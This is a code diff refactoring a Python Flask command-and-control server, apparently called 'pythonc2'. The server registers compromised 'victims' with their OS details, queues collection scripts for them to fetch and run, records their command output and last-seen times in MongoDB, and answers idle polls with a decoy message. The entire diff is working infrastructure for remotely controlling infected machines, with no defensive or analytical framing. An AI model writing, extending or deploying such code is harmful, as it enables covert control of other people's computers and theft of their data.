@@ -1,16 +1,19 @@
 from flask import Flask,request
 from pathlib import Path
+from lib.database import Database
+from lib.task import Task
+from lib.victim import Victim
 import  os
 import pymongo
 import logging
 import pdb
 import base64
-import datetime
+
 import pdb
 import time
 
 
-def main(myclient):
+def main(db_object):
 	app = Flask('app')
 
 	## Get the cookie/victim ID from a request
@@ -21,35 +24,11 @@ def main(myclient):
 		else:
 			return False
 
-	## Updates last seen whenever a new request is seen from the victim
-	def update_last_seen(mydb,victim_id):
-		victims = mydb["victims"]
-		h = {'id':victim_id}
-		victims.find_one_and_update(h,{ "$set": { "lastseen": datetime.datetime.now() } })
-
 
 	def get_victim_info(request):
 		return request.form.to_dict()
 
 
-	## Handles/sends the commands issued by the server
-	def handle_commands(cmd_object):
-		cmd = cmd_object['command']
-		task_id = cmd_object['task_id']
-
-		language = 'python'
-		utility = 'collection'
-
-		## Send command script to victim
-		if language == 'python':
-			module_path = os.path.join(os.getcwd(), "modules",language,utility,cmd+".py")
-		else:
-			module_path = os.path.join(os.getcwd(), "modules",language,utility,cmd+".ps1")
-
-		f = open(module_path, "r")
-		script = f.read()
-		return {'task_id': task_id, 'language': language, 'cmd': cmd, 'script': script}
-	
 	## Insert the command output in the Database
 	def insert_cmd_output(output,victim_id,task_id):
 		mydb = myclient["pythonc2"]
@@ -63,6 +42,7 @@ def main(myclient):
 
 	@app.route('/',methods = ['GET', 'POST'])
 	def run():
+		myclient = db_object.mongoclient
 		if request.method == 'GET':
 			mydb = myclient["pythonc2"]
 			cmds = mydb["commands"]
@@ -71,18 +51,19 @@ def main(myclient):
 
 			## Update last seen
 			if victim_id:
-				update_last_seen(mydb,victim_id)
+				if victim_id in Victim.victims.keys():
+					victim_obj = Victim.victims[victim_id]
+					victim_obj.update_last_seen_to_db()
+					print(f"Updates last seen of {victim_obj.victim_id}")
 
-			## Finding only the commands for this victim id and which hasn't been issued yet
-			x = cmds.find({'victim_id': victim_id, 'issued':False})
+			task = Task.find_unissued_task(victim_id)
 
-
-			## Issue the command present in the database
-			for cmd in x:
-				script = handle_commands(cmd)
-				h = {'victim_id':cmd['victim_id'],'task_id':cmd['task_id']}
-				cmds.find_one_and_update(h,{ "$set": { "issued": True } })
-				return script
+			## If there is any task
+			if task:
+				task_obj = Task.load_task(task)
+				task_dict = task_obj.issue_dict()
+				
+				return task_dict
 
 			## Default reply of server incase no commands
 			return 'Nothing Fishy going on here :)'
@@ -138,7 +119,8 @@ def main(myclient):
 				## Not a valid cmd,, Do something?? TODO
 				pass
 			
-			insert_cmd_output(output,victim_id,task_id)
+			task_obj = Task.tasks[task_id]
+			task_obj.insert_cmd_output(output)
 
 			return "OK"
 
@@ -148,36 +130,48 @@ def main(myclient):
 	@app.route('/stage_0',methods = ['POST'])
 	def stage():
 		if request.method == 'POST':
+			myclient = db_object.mongoclient
+
 			mydb = myclient["pythonc2"]
 			cmds = mydb["commands"]
-
-			victim_id = get_cookie(request)
 			victims = mydb['victims']
+
+
+			## Get the victim id of the new victim
+			victim_id = get_cookie(request)
+
+			## Get the other info about the victim
 			info = get_victim_info(request)
+			
 
-		if victim_id:
+			if victim_id:
+				## instantiate a new victim object
+				victim_obj = Victim(victim_id = victim_id,platform = info['platform'],os_version = info['version'])
 
-			## Add the id and the OS info sent by victim
-			h = {'id':victim_id}
-			h.update(info)
 
-			## Make sure victim ID doesn't exists
-			if not victims.find_one(h):
+				if victim_obj:
+					return ('Victim registered', 200)
+				else:
+					return ('Victim already registered', 302)
 
-				## Add the last name and insert to DB
-				h['lastseen'] = datetime.datetime.now()
-				victims.insert_one(h)
-				
-				return ('Victim registered', 200)
-			else:
-				return ('Victim already registered', 302)
+			return ('Bad request', 400)
 
-		return ('Bad request', 400)
+
+	####################################### Client Error Recieved  ####################################
+
+	@app.route('/clienterror',methods = ['POST'])
+	def clienterror():
+		if request.method == 'POST':
+			print(f"Recieved error from victim - {request.data.decode('utf-8')}")
+
+			return ('Error Recieved, we will get back to you', 200)
 
 	app.run(host = '0.0.0.0', port = 8080)
 
 
 
 if __name__=="__main__":
-	myclient = pymongo.MongoClient("mongodb://localhost:27017/")
-	main(myclient)
+	db_object = Database(url="mongodb://localhost:27017/")
+	Victim.mongoclient = db_object.mongoclient
+	Task.mongoclient = db_object.mongoclient
+	main(db_object)
